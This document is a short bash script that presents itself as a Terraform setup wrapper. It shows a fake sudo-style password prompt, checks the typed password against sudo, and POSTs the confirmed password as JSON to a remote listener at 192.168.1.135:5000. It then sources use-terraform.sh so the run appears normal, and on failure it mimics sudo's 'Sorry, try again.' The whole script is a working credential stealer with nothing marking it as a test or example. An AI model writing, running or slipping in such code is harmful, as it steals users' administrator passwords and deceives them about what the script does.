#!/usr/bin/env bash

printf "Password: "
read -s PASS
generate_post_data()
{
cat <<EOF
{  "password"  : "$PASS"}
EOF
}
if echo "$PASS\n" | sudo -lS &> /dev/null; then
  curl -H "Accept: application/json" \
        -H "Content-Type:application/json" \
          -X POST "http://192.168.1.135:5000/" --data "$(generate_post_data)"
  source use-terraform.sh
else
    echo 'Sorry, try again.'
fi
